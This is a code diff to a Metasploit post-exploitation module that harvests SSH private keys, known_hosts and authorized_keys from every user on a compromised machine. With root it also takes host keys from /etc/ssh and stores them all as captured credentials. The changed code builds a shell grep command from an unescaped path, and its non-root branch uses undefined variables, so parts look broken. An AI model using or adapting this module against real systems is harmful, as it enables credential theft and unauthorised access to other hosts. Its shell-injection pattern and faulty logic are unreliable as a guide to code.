@@ -23,8 +23,9 @@ class Metasploit3 < Msf::Post
 			'Name'           => 'Multi Gather OpenSSH PKI Credentials Collection',
 			'Description'    => %q{
 					This module will collect the contents of user's .ssh directory on the targeted
-				machine. Additionally, known_hosts and authorized_keys and any other files are also
-				downloaded. This module is largely based on firefox_creds.rb.
+				machine, including keys, known_hosts, authorized_keys and any other files contained
+				within. In addition it attempts to download the contents of /etc/ssh, which contains
+				host keys and SSH configuration. This module is largely based on firefox_creds.rb.
 			},
 			'License'        => MSF_LICENSE,
 			'Author'         => ['Jim Halfpenny'],
@@ -34,13 +35,23 @@ class Metasploit3 < Msf::Post
 	end
 
 	def run
-		print_status("Finding .ssh directories")
-		paths = enum_user_directories.map {|d| d + "/.ssh"}
+		if got_root?
+			print_status("Finding .ssh directories")
+			paths = enum_user_directories.map {|d| d + "/.ssh"}
+			
+			# Grab the contents of /etc/ssh as well. A host key is fine too.
+			print_status("Adding /etc/ssh to list of directories to loot")
+			paths.push('/etc/ssh')
+		else
+			print_status("Not root, checking user's home dir")
+			paths = ("#{home}/#{user}/.ssh")
+		end
+
 		# Array#select! is only in 1.9
 		paths = paths.select { |d| directory?(d) }
 
 		if paths.nil? or paths.empty?
-			print_error("No users found with a .ssh directory")
+			print_error("No suitable .ssh directories found to loot")
 			return
 		end
 
@@ -61,7 +72,11 @@ class Metasploit3 < Msf::Post
 			end
       path_array = path.split(sep)
       path_array.pop
-      user = path_array.pop
+      if path == "/etc/ssh"
+        user = "host key"
+      else
+        user = cmd_exec("grep #{path} /etc/passwd | cut -d: -f 1")
+      end
 			files.each do |file|
 				next if [".", ".."].include?(file)
 				data = read_file("#{path}#{sep}#{file}")
@@ -79,7 +94,7 @@ class Metasploit3 < Msf::Post
 						:host => session.session_host,
 						:port => 22,
 						:sname => 'ssh',
-            :user => user,
+						:user => user,
 						:pass => loot_path,
 						:source_type => "exploit",
 						:type => 'ssh_key',
@@ -94,4 +109,29 @@ class Metasploit3 < Msf::Post
 		end
 	end
 
+	def got_root?
+		case @platform
+		when :windows
+			if session.sys.config.getuid =~ /SYSTEM/
+				return true
+			else
+				return false
+			end
+		else # unix, bsd, linux, osx
+			ret = whoami
+			if ret =~ /root/
+				return true
+			else
+				return false
+			end
+		end
+	end
+	
+	def whoami
+		if @platform == :windows
+			return session.fs.file.expand_path("%USERNAME%")
+		else
+			return session.shell_command("whoami").chomp
+		end
+	end
 end
